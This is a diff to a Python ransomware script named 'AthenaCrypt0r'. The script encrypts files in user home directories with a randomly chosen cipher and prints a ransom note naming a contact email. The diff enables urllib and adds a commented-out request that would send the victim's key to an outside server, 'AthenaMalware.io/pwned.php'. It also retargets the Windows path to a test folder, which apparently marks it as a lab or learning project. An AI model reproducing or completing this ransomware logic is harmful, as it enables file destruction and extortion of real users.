@@ -3,7 +3,7 @@ import os
 import hashlib as h
 import random as r
 import time as t
-#import urllib.request
+import urllib.request
 import reverseCryptor as rc
 import caeser as ca
 import railfence as rail
@@ -21,7 +21,7 @@ def generateKey():
 def main(key):
 
     if os.name == "nt":
-        path = "C:/Users/"
+        path = "C:/TestFolder/"
     else:
         path = "/home/"
 
@@ -32,7 +32,12 @@ def main(key):
     r.choice(EncryptionAlgorithms)(files)
 
     bitcoin = r.random()
-
+    '''
+    data = parse.urlencode(key).encode()
+    req =  request.Request("http://AthenaMalware.io/pwned.php", data=data) 
+    resp = request.urlopen(req)
+    '''
+    
     print("============================================================================================")
     print("All your files have been encrypted with AthenaCrypt0r :)")
     print("To ever see your files again, please email athena@protonmail.ch with the following key: "+key)
